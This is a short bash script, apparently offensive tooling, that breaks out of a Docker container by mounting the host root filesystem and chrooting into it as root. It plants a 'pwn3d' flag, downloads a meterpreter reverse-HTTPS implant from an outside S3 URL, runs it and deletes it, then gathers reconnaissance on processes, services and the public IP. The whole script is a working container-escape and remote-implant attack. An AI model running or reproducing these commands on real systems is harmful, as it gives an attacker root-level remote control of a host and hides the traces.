#!/bin/bash

# now breakout, implant reverse shell, and tunnel
docker run --network host -v /:/host debian:latest /bin/bash -c ' \
  chroot /host su - root -c " \
    echo RECON:route table ; netstat -rn ; \
    echo RECON:plant flag ; echo pwn3d by enkaskal >> /tmp/.flag ; \
    echo RECON:confirm flag ; cat /tmp/.flag ; \
    echo RECON:nc ; which nc ; \
    echo EXPLOIT:download implant ; curl -sL -o /tmp/.blah https://s3-us-west-2.amazonaws.com/cryp7-static/implants/meterpreter/reverse_https/linux/x64/meterp.sh ; \
    echo EXPLOIT:run implant ; chmod +x /tmp/.blah ; /bin/bash -c /tmp/.blah ; \
    echo EXPLOIT:cleanup implant ; rm -f /tmp/.blah ; \
    echo RECON:nc ; which nc ; \
    echo RECON:post ps aux ; ps aux ; \
    echo RECON:enkaskal services ; systemctl list-unit-files | grep enkaskal ; \
    echo RECON:WANIP ; curl -s https://wtfismyip.com/text ; \
  "
'
